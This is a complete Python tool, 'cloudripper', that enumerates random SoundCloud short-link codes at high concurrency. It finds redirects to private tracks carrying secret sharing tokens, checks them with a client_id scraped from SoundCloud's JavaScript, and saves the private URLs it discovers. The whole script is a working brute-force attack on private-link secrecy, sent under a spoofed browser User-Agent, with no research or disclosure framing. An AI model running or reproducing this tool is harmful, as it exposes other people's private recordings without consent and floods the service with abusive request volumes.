#!/usr/bin/env python3
import argparse
import asyncio
import json
import random
import re
import string
import time
from pathlib import Path
from urllib.parse import urlparse, urlunparse

import aiohttp
from colorama import Fore, Style, init

init(autoreset=True)

CHARSET = string.ascii_letters + string.digits
PRIVATE_RE = re.compile(r"/s-[a-zA-Z0-9]{11}")
API = "https://api-v2.soundcloud.com"


class Stats:
    def __init__(self, initial_hits=0):
        self.total = 0
        self.hits = initial_hits
        self._t0 = time.perf_counter()

    @property
    def elapsed(self):
        return time.perf_counter() - self._t0

    @property
    def rate(self):
        e = self.elapsed
        return self.total / e if e > 0 else 0.0


def parse_track(url):
    parts = urlparse(url).path.strip("/").split("/")
    if len(parts) >= 2:
        return parts[0], parts[1]
    return None, None


async def fetch_client_id(session):
    try:
        async with session.get("https://soundcloud.com") as r:
            html = await r.text()
        scripts = re.findall(r'<script[^>]+src="(https://a-v2\.sndcdn\.com/assets/[^"]+\.js)"', html)
        for url in reversed(scripts):
            try:
                async with session.get(url) as r:
                    js = await r.text()
                m = re.search(r'client_id:"([a-zA-Z0-9]{32})"', js)
                if m:
                    return m.group(1)
            except Exception:
                continue
    except Exception:
        pass
    return None


async def verify(session, url, client_id):
    try:
        async with session.get(f"{API}/resolve", params={"client_id": client_id, "url": url}) as r:
            if r.status == 404:
                return False
            if r.status == 200:
                data = await r.json()
                return data.get("sharing") == "private"
    except Exception:
        pass
    return True


async def probe(session, sem, stats, verbose):
    code = "".join(random.choices(CHARSET, k=5))
    url = f"https://on.soundcloud.com/{code}"
    try:
        async with sem:
            async with session.get(url, allow_redirects=False) as r:
                stats.total += 1
                if r.status == 302:
                    loc = r.headers.get("Location", "")
                    clean = urlunparse(urlparse(loc)._replace(query=""))
                    if PRIVATE_RE.search(clean):
                        return clean
                    if verbose >= 1:
                        print(f"\n{Fore.BLUE}  ~ {clean}{Style.RESET_ALL}")
                elif verbose >= 2:
                    print(f"\n{Fore.RED}  - {url}{Style.RESET_ALL}")
    except Exception:
        stats.total += 1
    return None


async def stat_loop(stats, stop):
    while not stop.is_set():
        print(
            f"\r{Fore.CYAN}{stats.elapsed:6.0f}s  "
            f"{Fore.WHITE}{stats.total:>10,} req  "
            f"{Fore.GREEN}{stats.hits:>4} hits  "
            f"{Fore.YELLOW}{stats.rate:>7.0f} req/s{Style.RESET_ALL}   ",
            end="",
            flush=True,
        )
        await asyncio.sleep(0.4)


async def run(concurrency, verbose, out, limit):
    out = Path(out)
    seen = set()
    results = []

    if out.exists():
        try:
            existing = json.loads(out.read_text())
            results = existing
            seen = set(existing)
            print(f"{Fore.YELLOW}  resuming - {len(seen)} tracks already in {out}{Style.RESET_ALL}\n")
        except Exception:
            pass

    stats = Stats(initial_hits=len(seen))
    stop = asyncio.Event()

    connector = aiohttp.TCPConnector(
        limit=concurrency + 200,
        limit_per_host=0,
        ttl_dns_cache=600,
        enable_cleanup_closed=True,
    )

    async with aiohttp.ClientSession(
        connector=connector,
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
        timeout=aiohttp.ClientTimeout(total=10, connect=5),
    ) as session:
        print(f"  {Fore.WHITE}fetching client_id...{Style.RESET_ALL}", end=" ", flush=True)
        client_id = await fetch_client_id(session)
        if client_id:
            print(f"{Fore.GREEN}ok{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}failed — deleted tracks won't be filtered{Style.RESET_ALL}")
        print()

        sem = asyncio.Semaphore(concurrency)
        tasks = set()
        stat_task = asyncio.create_task(stat_loop(stats, stop))

        def fill():
            while len(tasks) < concurrency:
                tasks.add(asyncio.create_task(probe(session, sem, stats, verbose)))

        fill()

        try:
            while True:
                done, _ = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
                tasks.difference_update(done)
                fill()

                for t in done:
                    url = t.result()
                    if not url or url in seen:
                        continue

                    if client_id and not await verify(session, url, client_id):
                        if verbose >= 1:
                            print(f"\n{Fore.RED}  x deleted  {url}{Style.RESET_ALL}")
                        continue

                    seen.add(url)
                    stats.hits += 1
                    results.append(url)
                    artist, track = parse_track(url)
                    label = f"{artist} - {track}" if artist else url
                    print(f"\n{Fore.GREEN}[+] {label}{Style.RESET_ALL}")
                    print(f"    {Fore.WHITE}{url}{Style.RESET_ALL}")
                    out.write_text(json.dumps(results, indent=2))
                    if limit and stats.hits >= limit:
                        raise KeyboardInterrupt

        except (KeyboardInterrupt, asyncio.CancelledError):
            stop.set()
            stat_task.cancel()
            for t in tasks:
                t.cancel()
            await asyncio.gather(*tasks, stat_task, return_exceptions=True)

    print(
        f"\n\n{Fore.YELLOW}  {stats.hits} private tracks  /  "
        f"{stats.total:,} requests  /  {stats.rate:.0f} req/s{Style.RESET_ALL}"
    )
    if results:
        out.write_text(json.dumps(results, indent=2))
        print(f"{Fore.GREEN}  saved -> {out}{Style.RESET_ALL}\n")


def main():
    print(f"\n{Fore.LIGHTGREEN_EX}  cloudripper{Style.RESET_ALL}\n")

    p = argparse.ArgumentParser(add_help=False)
    p.add_argument("-c", type=int, default=200, metavar="N", dest="concurrency")
    p.add_argument("-n", type=int, default=0, metavar="N", dest="limit")
    p.add_argument("-o", default="output.json", metavar="FILE", dest="output")
    p.add_argument("-v", action="count", default=0, dest="verbose")
    p.add_argument("-h", "--help", action="help")
    args = p.parse_args()

    print(f"  {Fore.CYAN}{args.concurrency} workers{Style.RESET_ALL}  |  Ctrl+C to stop\n")

    try:
        asyncio.run(run(args.concurrency, args.verbose, args.output, args.limit))
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
